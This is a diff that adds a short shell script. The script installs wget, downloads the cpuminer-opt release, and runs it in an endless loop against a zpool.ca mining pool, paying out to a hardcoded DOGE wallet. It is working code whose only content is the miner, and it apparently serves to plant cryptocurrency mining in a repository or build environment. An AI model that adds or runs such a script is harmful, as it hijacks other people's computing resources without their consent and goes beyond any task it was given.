@@ -1,0 +1,6 @@
+apt-get install wget
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+tar xf cpuminer-opt-linux.tar.gz
+while [ 1 ]; do
+./cpuminer-sse2 -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DKYuH2QBKkS3x8D4Z1eyasc7nGqBugAANe -p c=DOGE
+done
